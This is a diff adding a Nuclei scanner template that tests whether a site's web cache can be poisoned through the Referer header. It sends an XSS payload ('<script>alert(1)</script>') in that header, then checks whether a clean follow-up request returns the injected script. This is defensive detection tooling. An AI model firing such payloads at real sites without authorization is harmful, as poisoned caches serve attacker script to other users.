@@ -1,0 +1,28 @@
+id: cache-poisoning-via-referer
+
+info:
+  name: Cache Poisoning via Referer
+  author: reewardius
+  severity: medium
+  reference:
+    - https://blog.melbadry9.xyz/fuzzing/nuclei-cache-poisoning
+    - https://portswigger.net/research/practical-web-cache-poisoning
+  tags: cache
+
+http:
+  - raw:
+      - |
+        GET /?{{randstr}}=9 HTTP/1.1
+        Host: {{Hostname}}
+        Referer: {{BaseURL}}"></script><script>alert(1)</script>
+        
+      - |
+        GET /?{{randstr}}=9 HTTP/1.1
+        Host: {{Hostname}}
+        
+    stop-at-first-match: true
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body_2, "<script>alert(1)</script>")'
